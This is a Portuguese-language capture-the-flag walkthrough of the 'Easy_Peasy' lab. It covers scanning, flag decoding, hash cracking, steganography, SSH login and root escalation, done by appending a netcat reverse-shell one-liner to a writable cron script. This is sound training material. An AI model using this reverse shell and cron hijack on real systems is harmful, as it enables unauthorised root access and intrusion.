# Easy_Peasy

* ### Scan de portas - Verificando quais portas estão abertas.
```bash
rustscan -a 10.10.54.248
```
![image](https://github.com/lufffe/Writeups/assets/90646635/c16ab2e8-ba8b-4f5e-8fba-3690df24a356)

![image](https://github.com/lufffe/Writeups/assets/90646635/680344db-197b-45c1-87d2-9e6d5171c2bc)

* ### Verificando o que está rodando nas portas encontradas.
```bash
nmap -A -p 80,6498,65524 10.10.54.248
```
![image](https://github.com/lufffe/Writeups/assets/90646635/219c29de-66af-44fb-aff5-a2c9d007a587)

* ### Scan de Pastas e arquivos na raiz.
```bash
gobuster dir -u http://10.10.54.248:80 -w directory-list-2.3-small.txt -t 100 --no-error
```
![image](https://github.com/lufffe/Writeups/assets/90646635/8981dd55-0bae-4e1d-bfd5-4be827e571e7)

* ### Scan de Pastas e arquivos na pasta encontrada.
```bash
gobuster dir -u http://10.10.54.248:80/hidden -w directory-list-2.3-small.txt -t 100 --no-error
```
![image](https://github.com/lufffe/Writeups/assets/90646635/8aec38ec-473e-440c-89f4-077637c43a16)

* ### Encontrado uma frase codificada em base64 se decodificar encontrará a primeira flag.
![image](https://github.com/lufffe/Writeups/assets/90646635/413ad89b-7427-4595-a7a6-b59656239a12)

* ### No Robots da porta 65524, no arquivo robots.txt encontramos um usuário e um hash, se decodificar em md5 você encontrará a segunda flag.
![image](https://github.com/lufffe/Writeups/assets/90646635/25a48bc4-33c1-47a6-8f10-db1d1d2401ae)

* ### No Codigo da pagina você encontrará a terceira flag, .
![image](https://github.com/lufffe/Writeups/assets/90646635/a1e9034e-a666-4d51-a73b-b8048ed0b950)

* ### Na mesma página da flag, algo encodado em base62 .
![image](https://github.com/lufffe/Writeups/assets/90646635/91b7fc16-eaab-4256-abac-b8401bc1831f)

* ### Na mesma página da flag, algo encodado em base62 .
![image](https://github.com/lufffe/Writeups/assets/90646635/aceedb69-21b3-4b7d-9789-46af5a887c10)

* ### Resposta de uma das perguntas, vamos ver onde utulizar ela.
```bash
john hash --wordlist=easypeasy.txt --format=GOST
```
![image](https://github.com/lufffe/Writeups/assets/90646635/f15e3e60-e0aa-4b9c-9e5f-20b413d12d5a)

* ### Baixando a imagem para verificar se tem algo nela.
```bash
wget http://10.10.237.140:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg
```

* ### Extraindo informações da imagem, e encontramos onde usar a senha que achamos.
```bash
steghide extract -sf binarycodepixabay.jpg
```
![image](https://github.com/lufffe/Writeups/assets/90646635/e9f4de53-f01a-4766-8f58-e59df0f292fb)

* ### Arquivo extraido.
![image](https://github.com/lufffe/Writeups/assets/90646635/4dd82a5b-e104-4dee-aad5-9da1ab881dcf)

* ### Conversão Binario para texto.
![image](https://github.com/lufffe/Writeups/assets/90646635/bb2f312e-c45a-422d-aa6c-1986d7719df7)

* ### Como achamos o usuário e a senha, vmaos fazer o acesso via SSH.
```bash
ssh boring@10.10.237.140 -p 6498
```
![image](https://github.com/lufffe/Writeups/assets/90646635/15889acd-077d-4985-a99b-743ee5de478f)

* ### Mais um decode agora em Rot13, essa é a flag Usuário.
![image](https://github.com/lufffe/Writeups/assets/90646635/85020c63-427d-4d1c-83bb-184f973186ed)

* ### Verificando como escalar previlégio.
```bash
cat /etc/crontab
```
![image](https://github.com/lufffe/Writeups/assets/90646635/f6aaceab-c50d-4877-ade0-5a975dcac875)

* ### Conferindo o arquivo que estava no cron.
```bash
cat /var/www/.mysecretcronjob.sh
```
![image](https://github.com/lufffe/Writeups/assets/90646635/75d5d628-3448-4c1b-883c-6bf89d6a495e)


* ### Colocando uma reverse Shell no arquivo que o cron executa automaticamente e coloca o netcat para ouvir essa porta.
```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP 4445 >/tmp/f" >> .mysecretcronjob.sh
```
![image](https://github.com/lufffe/Writeups/assets/90646635/f790d30d-2521-4e17-809a-c2a3043fcc07)

* ### Flag Root.
```bash
cat .root.txt
```
